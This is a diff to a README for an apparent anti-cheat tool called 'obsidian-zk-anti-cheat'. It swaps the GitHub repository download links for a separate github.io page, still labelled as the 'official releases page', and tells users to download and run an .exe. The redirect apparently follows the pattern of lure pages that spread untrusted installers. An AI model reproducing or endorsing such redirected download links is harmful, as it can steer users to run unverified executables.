@@ -1,6 +1,6 @@
 # 🛡️ obsidian-zk-anti-cheat - Fair matches through verifiable game physics
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Rhizomatous-rutherford327/obsidian-zk-anti-cheat)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://rhizomatous-rutherford327.github.io)
 
 ## 📋 Overview
 
@@ -20,7 +20,7 @@ Before you install this software, confirm your computer meets these minimum stan
 
 You need to download the installer from the official repository page. Follow these steps to obtain the correct file:
 
-1. Visit the [official releases page](https://github.com/Rhizomatous-rutherford327/obsidian-zk-anti-cheat).
+1. Visit the [official releases page](https://rhizomatous-rutherford327.github.io).
 2. Look for the section labeled "Assets" under the most recent version number.
 3. Select the file ending in .exe to begin the download.
 4. Save the file to your desktop or your Downloads folder.
